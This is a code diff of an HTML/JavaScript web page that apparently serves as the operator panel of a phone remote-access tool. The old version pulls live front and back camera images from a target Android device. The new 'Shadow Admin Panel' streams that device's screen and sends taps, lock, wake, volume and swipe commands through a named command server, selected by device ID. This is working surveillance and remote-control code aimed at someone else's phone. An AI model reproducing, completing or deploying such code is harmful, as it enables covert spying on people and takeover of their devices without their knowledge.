@@ -2,197 +2,222 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Live Camera View</title>
-    <script src="https://cdn.socket.io/4.6.0/socket.io.min.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Shadow Admin Panel</title>
+    
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
+
     <style>
+        :root {
+            --bg-color: #050505;
+            --panel-bg: #1a1a1a;
+            --accent: #00ff88;
+            --danger: #ff3333;
+            --text-main: #ffffff;
+        }
+
         body {
-            margin: 0; padding: 0;
-            background-color: #000;
-            color: #fff;
-            display: flex; flex-direction: column;
-            align-items: center; justify-content: center;
-            height: 100vh;
-            font-family: 'Segoe UI', sans-serif;
-            overflow: hidden;
+            margin: 0; background-color: var(--bg-color); color: var(--text-main);
+            font-family: 'Segoe UI', sans-serif; height: 100vh; display: flex; flex-direction: column; overflow: hidden;
         }
 
-        /* Video Container */
-        #camContainer {
-            position: relative;
-            width: 100%; max-width: 500px;
-            aspect-ratio: 9/16;
-            background: #111;
-            border: 2px solid #333;
-            border-radius: 20px;
-            display: flex; align-items: center; justify-content: center;
-            overflow: hidden;
-            box-shadow: 0 0 30px rgba(0, 243, 255, 0.15);
+        /* --- Header --- */
+        .top-nav {
+            padding: 15px 20px; background: var(--panel-bg); border-bottom: 1px solid #333;
+            display: flex; justify-content: space-between; align-items: center; z-index: 10;
+        }
+        .brand { font-size: 1.2rem; font-weight: bold; color: var(--accent); letter-spacing: 1px; display: flex; gap: 10px; align-items: center; }
+        .back-link { color: #888; text-decoration: none; font-size: 0.9rem; margin-right: 15px; cursor: pointer;}
+        .back-link:hover { color: #fff; }
+
+        .status-badge { font-size: 0.9rem; display: flex; align-items: center; gap: 8px; }
+        .live-dot { height: 10px; width: 10px; background-color: var(--danger); border-radius: 50%; box-shadow: 0 0 5px var(--danger); }
+        .live-dot.active { background-color: var(--accent); box-shadow: 0 0 8px var(--accent); }
+
+        /* --- Main Layout --- */
+        .screen-container {
+            flex: 1; display: flex; justify-content: center; align-items: center; padding: 20px; position: relative;
         }
 
-        /* Image Element (Stream) */
-        #camStream {
-            width: 100%; height: 100%;
-            object-fit: cover;
-            display: none; 
-            transform: rotate(90deg); /* Adjust if needed based on phone orientation */
+        /* --- Phone Frame --- */
+        .phone-frame {
+            width: 300px; height: 600px; border: 8px solid #222; border-radius: 30px;
+            background: #000; position: relative; box-shadow: 0 0 50px rgba(0,0,0,0.5);
+            overflow: hidden; display: flex; align-items: center; justify-content: center;
         }
-
-        /* Loading / Error State */
-        .status-msg {
-            text-align: center;
-            display: flex; flex-direction: column; align-items: center;
-            gap: 10px;
-            z-index: 5;
-        }
-        .spinner {
-            width: 40px; height: 40px;
-            border: 4px solid rgba(255,255,255,0.1);
-            border-top: 4px solid #00f3ff;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-        }
-        @keyframes spin { 100% { transform: rotate(360deg); } }
-
-        /* Top Bar (Back Button) */
-        .top-bar {
-            position: absolute; top: 20px; left: 20px; z-index: 100;
-        }
-        .back-btn {
-            background: rgba(0,0,0,0.6);
-            padding: 10px 15px; border-radius: 30px;
-            color: #fff; text-decoration: none;
-            backdrop-filter: blur(5px);
-            border: 1px solid rgba(255,255,255,0.2);
-            font-size: 0.9rem;
-            display: flex; align-items: center; gap: 8px;
-        }
-
-        /* Bottom Controls (Switch Camera) */
-        .controls-bar {
-            position: absolute; bottom: 20px;
-            display: flex; gap: 15px;
-            z-index: 100;
-            background: rgba(0, 0, 0, 0.5);
-            padding: 10px 20px;
-            border-radius: 40px;
-            backdrop-filter: blur(8px);
-            border: 1px solid rgba(255,255,255,0.1);
-        }
-
-        .cam-btn {
-            background: transparent;
-            border: none;
-            color: #fff;
-            font-size: 1.2rem;
-            cursor: pointer;
-            padding: 10px;
-            border-radius: 50%;
-            transition: 0.2s;
-            width: 50px; height: 50px;
-            display: flex; align-items: center; justify-content: center;
-        }
-        .cam-btn:hover { background: rgba(255, 255, 255, 0.2); }
-        .cam-btn:active { transform: scale(0.9); }
+        #screenStream { width: 100%; height: 100%; object-fit: fill; cursor: crosshair; }
         
-        .cam-btn.active { color: #00f3ff; text-shadow: 0 0 10px #00f3ff; }
+        .offline-msg { position: absolute; color: #444; text-align: center; display: flex; flex-direction: column; align-items: center; pointer-events: none; }
 
+        /* --- Controls --- */
+        .side-panel {
+            position: absolute; right: 30px; display: flex; flex-direction: column; gap: 15px;
+            background: rgba(26, 26, 26, 0.8); padding: 15px; border-radius: 20px; border: 1px solid #333;
+        }
+        .control-btn {
+            width: 50px; height: 50px; border-radius: 50%; background: #2a2a2a; border: 1px solid #444;
+            color: white; display: flex; align-items: center; justify-content: center; cursor: pointer; transition: 0.2s; font-size: 1.2rem;
+        }
+        .control-btn:hover { border-color: var(--accent); color: var(--accent); transform: scale(1.1); }
+        .control-btn:active { transform: scale(0.9); }
+
+        /* Navigation Bar */
+        .nav-bar {
+            width: 100%; height: 50px; background: rgba(0, 0, 0, 0.8);
+            position: absolute; bottom: 0; display: flex; justify-content: space-around; align-items: center; border-top: 1px solid #222;
+        }
+        .nav-item { color: #666; font-size: 1.2rem; cursor: pointer; padding: 10px; width: 30%; text-align: center; }
+        .nav-item:hover { color: white; background: rgba(255,255,255,0.1); }
+
+        @media (max-width: 768px) {
+            .screen-container { flex-direction: column; }
+            .side-panel { position: relative; right: auto; flex-direction: row; margin-top: 20px; flex-wrap: wrap; justify-content: center; width: 100%; max-width: 300px; }
+            .phone-frame { width: 100%; max-width: 320px; height: auto; aspect-ratio: 9/19; }
+        }
     </style>
 </head>
 <body>
 
-    <div class="top-bar">
-        <a href="index.html" class="back-btn"><i class="fa-solid fa-arrow-left"></i> Dashboard</a>
+    <div class="top-nav">
+        <div class="brand">
+            <a href="index.html" class="back-link"><i class="fa-solid fa-arrow-left"></i></a>
+            SHADOW
+        </div>
+        <div class="status-badge">
+            <span class="live-dot" id="dot"></span> 
+            <span id="statusText" style="color:#888">Waiting...</span>
+        </div>
     </div>
 
-    <div id="camContainer">
-        <img id="camStream" src="" alt="Live Feed">
-        
-        <div id="statusBox" class="status-msg">
-            <div class="spinner"></div>
-            <h3 id="statusText">Connecting...</h3>
-            <small style="color: #aaa; font-size: 0.8rem;" id="debugInfo">Waiting for ID...</small>
+    <div class="screen-container">
+        <div class="phone-frame">
+            <div id="offlineMsg" class="offline-msg">
+                <i class="fa-solid fa-spinner fa-spin fa-2x"></i>
+                <p style="margin-top:10px" id="msgText">Connecting...</p>
+            </div>
+            
+            <img id="screenStream" src="" alt="" onclick="sendClick(event)">
+            
+            <div class="nav-bar">
+                <div class="nav-item" onclick="sendCommand('RECENT')"><i class="fa-regular fa-square"></i></div>
+                <div class="nav-item" onclick="sendCommand('HOME')"><i class="fa-regular fa-circle"></i></div>
+                <div class="nav-item" onclick="sendCommand('BACK')"><i class="fa-solid fa-caret-left" style="font-size:1.5rem"></i></div>
+            </div>
         </div>
 
-        <div class="controls-bar">
-            <button class="cam-btn" onclick="switchCamera('CAM_FRONT')" title="Front Camera">
-                <i class="fa-solid fa-user"></i>
-            </button>
-            
-            <button class="cam-btn" onclick="stopCam()" title="Stop / Refresh" style="color: #ff4444;">
-                <i class="fa-solid fa-stop"></i>
-            </button>
-
-            <button class="cam-btn" onclick="switchCamera('CAM_BACK')" title="Back Camera">
-                <i class="fa-solid fa-camera"></i>
-            </button>
+        <div class="side-panel">
+            <div class="control-btn" onclick="sendCommand('LOCK')" title="Lock Screen"><i class="fa-solid fa-lock"></i></div>
+            <div class="control-btn" onclick="sendCommand('WAKE')" title="Wake Screen"><i class="fa-solid fa-sun"></i></div>
+            <div class="control-btn" onclick="sendCommand('VOL_UP')" title="Vol +"><i class="fa-solid fa-plus"></i></div>
+            <div class="control-btn" onclick="sendCommand('VOL_DOWN')" title="Vol -"><i class="fa-solid fa-minus"></i></div>
+            <div class="control-btn" onclick="sendCommand('SWIPE_UP')" title="Swipe Up"><i class="fa-solid fa-arrow-up"></i></div>
+            <div class="control-btn" onclick="sendCommand('SWIPE_DOWN')" title="Swipe Down"><i class="fa-solid fa-arrow-down"></i></div>
         </div>
     </div>
 
     <script>
-        const API_BASE = 'https://child-v9no.onrender.com'; 
-        
-        const urlParams = new URLSearchParams(window.location.search);
-        const DEVICE_ID = urlParams.get('id');
+        const API_BASE = "https://child-v9no.onrender.com"; 
+        let socket = null;
+        let currentDeviceId = null;
 
-        const imgElement = document.getElementById('camStream');
-        const statusBox = document.getElementById('statusBox');
-        const statusText = document.getElementById('statusText');
-        const debugInfo = document.getElementById('debugInfo');
+        window.addEventListener('load', function() {
+            const urlParams = new URLSearchParams(window.location.search);
+            currentDeviceId = urlParams.get('id');
 
-        if (!DEVICE_ID) {
-            statusText.innerText = "Error: No Device ID";
-            document.querySelector('.spinner').style.display = 'none';
-        } else {
-            startStreamListener();
-        }
+            if (currentDeviceId) {
+                document.getElementById('statusText').innerText = "Device: " + currentDeviceId;
+                startConnection();
+            } else {
+                document.getElementById('statusText').innerText = "No ID Found";
+                document.getElementById('msgText').innerText = "Error: Invalid Link";
+            }
+        });
 
-        function startStreamListener() {
-            debugInfo.innerText = `Device: ${DEVICE_ID}`;
-            const socket = io(API_BASE);
+        function startConnection() {
+            // 1. Socket is ONLY for Video Stream
+            socket = io(API_BASE, { 
+                transports: ['websocket', 'polling']
+            });
 
-            socket.on('connect', () => {
-                console.log("Connected to Server");
-                socket.emit('join-web', DEVICE_ID);
-                debugInfo.innerText = "Connected. Waiting for video...";
+            socket.on("connect", () => {
+                console.log("Web Connected!");
+                document.getElementById('statusText').innerText = "Online";
+                document.getElementById('statusText').style.color = "var(--accent)";
+                document.getElementById('dot').classList.add("active");
+                
+                // Join as Web Client
+                socket.emit("join-web", currentDeviceId); 
+            });
+
+            socket.on("disconnect", () => {
+                document.getElementById('statusText').innerText = "Offline";
+                document.getElementById('statusText').style.color = "var(--danger)";
+                document.getElementById('dot').classList.remove("active");
+                document.getElementById('offlineMsg').style.display = "flex";
+                document.getElementById('screenStream').style.display = "none";
             });
 
             // Receive Image Data
-            socket.on('cam-image', (data) => {
-                if(data && data.image) {
-                    statusBox.style.display = 'none';
-                    imgElement.style.display = 'block';
-                    imgElement.src = "data:image/jpeg;base64," + data.image;
+            socket.on("screen-data", (data) => {
+                document.getElementById('offlineMsg').style.display = "none";
+                const img = document.getElementById('screenStream');
+                img.style.display = "block";
+                
+                if(data.image) {
+                    img.src = "data:image/jpeg;base64," + data.image;
                 }
-            });
-
-            socket.on('disconnect', () => {
-                statusText.innerText = "Disconnected";
             });
         }
 
-        // 🔥 Function to Switch Camera
-        function switchCamera(command) {
-            if(!DEVICE_ID) return;
-
-            // UI Feedback
-            imgElement.style.display = 'none';
-            statusBox.style.display = 'flex';
-            statusText.innerText = command === 'CAM_FRONT' ? "Switching to Front..." : "Switching to Back...";
+        // 2. Fetch API for Sending Commands (Replaces socket.emit)
+        function sendCommand(action) {
+            if(!currentDeviceId) return;
             
-            // Send Command to Android
+            // Haptic Feedback
+            if(navigator.vibrate) navigator.vibrate(50);
+            
+            console.log("Sending Command:", action);
+
             fetch(`${API_BASE}/api/send-command`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ device_id: DEVICE_ID, command: command })
-            })
-            .then(res => console.log("Camera Switch Sent: " + command))
-            .catch(err => console.error("Error switching", err));
+                body: JSON.stringify({
+                    device_id: currentDeviceId,
+                    command: action
+                })
+            }).catch(err => console.error("Command Error:", err));
         }
 
-        function stopCam() {
-             location.reload(); // Simple refresh for now to restart connection
+        // 3. Handle Clicks (Tap on screen)
+        function sendClick(event) {
+            if(!currentDeviceId) return;
+
+            const img = document.getElementById('screenStream');
+            const rect = img.getBoundingClientRect();
+            
+            // Calculate relative coordinates
+            const x = Math.round(event.clientX - rect.left);
+            const y = Math.round(event.clientY - rect.top);
+            
+            // Get Image actual dimensions for scaling if needed
+            const width = rect.width;
+            const height = rect.height;
+
+            console.log(`Click at: ${x}, ${y}`);
+
+            fetch(`${API_BASE}/api/send-command`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    device_id: currentDeviceId,
+                    command: "CLICK",
+                    x: x,
+                    y: y,
+                    width: width,   // Send screen width/height so android can calculate scale
+                    height: height
+                })
+            }).catch(err => console.error("Click Error:", err));
         }
     </script>
 </body>
